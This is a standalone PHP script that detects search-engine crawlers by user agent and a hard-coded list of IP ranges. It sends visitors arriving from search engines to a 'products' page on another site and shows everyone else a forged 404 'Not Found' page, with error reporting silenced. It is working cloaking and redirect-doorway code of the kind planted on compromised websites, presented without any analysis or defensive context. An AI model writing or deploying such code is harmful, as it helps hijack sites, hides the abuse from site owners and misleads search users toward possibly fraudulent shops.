<?php

error_reporting(0);

global $site, $progName, $progID;

function checkBot(){
if (
   false !== stripos($_SERVER['HTTP_USER_AGENT'], 'Google')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'AdsBot-Google')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'gsa-crawler')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'http://www.googlebot.com/bot.html')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'http://www.google.com/bot.html')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'cloak')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'googlebot')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'yahoo')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'search')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'bing')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'ask')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'indexer')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'cuill.com')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'clushbot')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'Crawler')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'slurp')
   || false !== stripos($_SERVER['HTTP_USER_AGENT'], 'Scooter')
) return true;
$clientIp = $_SERVER["REMOTE_ADDR"];
// ������ ���������� �����
$botIps = Array(
  /* 2009-12-12 */ '66\.249\.[6-9][0-9]\.[0-9]+', '74\.125\.[0-9]+\.[0-9]+', '38\.[0-9]+\.[0-9]+\.[0-9]+', '70\.91\.180\.25', '65\.93\.62\.242', '74\.193\.246\.129', '213\.144\.15\.38', '195\.92\.229\.2', '70\.50\.189\.191', '218\.28\.88\.99', '165\.160\.2\.20', '89\.122\.224\.230', '66\.230\.175\.124', '218\.18\.174\.27', '65\.33\.87\.94', '67\.210\.111\.241', '81\.135\.175\.70', '64\.69\.34\.134', '89\.149\.253\.169', '69\.136\.208\.89', '83\.15\.211\.166', '78\.180\.145\.80', '78\.166\.111\.63', '64\.233\.1[6-8][1-9]\.[0-9]+', '64\.233\.19[0-1]\.[0-9]+', '209\.185\.108\.[0-9]+', '209\.185\.253\.[0-9]+', '209\.85\.238\.[0-9]+', '216\.239\.33\.9[6-9]', '216\.239\.37\.9[8-9]', '216\.239\.39\.9[8-9]', '216\.239\.41\.9[6-9]', '216\.239\.45\.4', '216\.239\.46\.[0-9]+', '216\.239\.51\.9[6-9]', '216\.239\.53\.9[8-9]', '216\.239\.57\.9[6-9]', '216\.239\.59\.9[8-9]', '216\.33\.229\.163', '64\.233\.173\.[0-9]+', '64\.68\.8[0-9]\.[0-9]+', '64\.68\.9[0-2]\.[0-9]+', '72\.14\.199\.[0-9]+', '8\.6\.48\.[0-9]+', '207\.211\.40\.82', '67\.162\.158\.146', '66\.255\.53\.123', '24\.200\.208\.112', '129\.187\.148\.240', '129\.187\.148\.244', '199\.126\.151\.229', '118\.124\.32\.193', '89\.149\.217\.191',
);
foreach($botIps as $botIp)
{
  if (preg_match("/^{$botIp}/", $clientIp)) return true;
}
return false;
}

if (!checkBot() && preg_match('#google|msn|live|altavista|ask|yahoo|aol|bing#i', $_SERVER['HTTP_REFERER'])){
	header("Location: http://".$site."/products/$progID");
	exit();
} 

if (!checkBot() && !preg_match('#google|msn|live|altavista|ask|yahoo|aol|bing#i', $_SERVER['HTTP_REFERER'])){
	
	header("{$_SERVER['SERVER_PROTOCOL']} 404 Not Found");
  die( <<<EOM
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>
<hr>
<address>{$_SERVER['SERVER_SOFTWARE']} Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}</address>
</body></html>
EOM
	);
	
}
    
?>
